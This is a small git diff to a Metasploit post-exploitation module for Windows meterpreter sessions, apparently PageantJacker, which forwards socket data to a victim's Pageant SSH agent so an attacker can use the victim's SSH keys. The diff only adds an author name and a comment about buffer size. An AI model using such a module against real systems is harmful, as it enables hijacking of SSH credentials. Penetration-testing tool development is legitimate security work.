@@ -26,7 +26,8 @@ class Metasploit3 < Msf::Post
                        },
                       'License'       => MSF_LICENSE,
                       'Author'        => [
-                        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'
+                        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
+                        'Ben Campbell',
                       ],
                       'Platform'      => [ 'win' ],
                       'SessionTypes'  => [ 'meterpreter' ]
@@ -72,7 +73,7 @@ class Metasploit3 < Msf::Post
       loop do
         s = serv.accept
         loop do
-          socket_request_data = s.recvfrom(8192)
+          socket_request_data = s.recvfrom(8192) # 8192 = AGENT_MAX
           break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
           vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
           response = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
